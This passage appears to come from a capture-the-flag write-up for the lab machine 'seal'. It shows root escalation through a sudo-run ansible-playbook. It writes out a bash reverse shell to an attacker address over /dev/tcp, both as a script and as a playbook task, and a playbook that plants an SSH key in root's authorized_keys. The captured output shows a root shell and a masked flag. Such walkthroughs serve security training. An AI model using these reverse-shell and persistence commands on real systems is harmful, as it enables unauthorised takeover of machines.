localhost                  : ok=4    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0

```

### Shell

#### Via Reverse Shell

I’ll create a simple Bash script to get a reverse shell:

```

luis@seal:/dev/shm$ vim rev.sh
luis@seal:/dev/shm$ cat rev.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.22/443 0>&1
luis@seal:/dev/shm$ chmod +x rev.sh 

```

After testing that it works, I’ll make a playbook to run it:

```
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'

```

Running it hangs in the rev task:

```

luis@seal:/dev/shm$ sudo ansible-playbook rev.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *******************************************************************************************************************

TASK [Gathering Facts] *************************************************************************************************************
ok: [localhost]

TASK [rev] *************************************************************************************************************************

```

But at `nc` there’s a shell:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.250] 49578
root@seal:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)

```

I can grab `root.txt`:

```

root@seal:~# cat root.txt
cfe39341************************

```

#### Via SSH

I could just as easily create a playbook to put my public SSH key into the root’s `authorized_keys` file:

```
- hosts: localhost
  tasks:
  - name: rev
    shell: mkdir -p /root/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys

```

After running this, I can connect as root:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@seal.htb 
...[snip]...
root@seal:~# 

```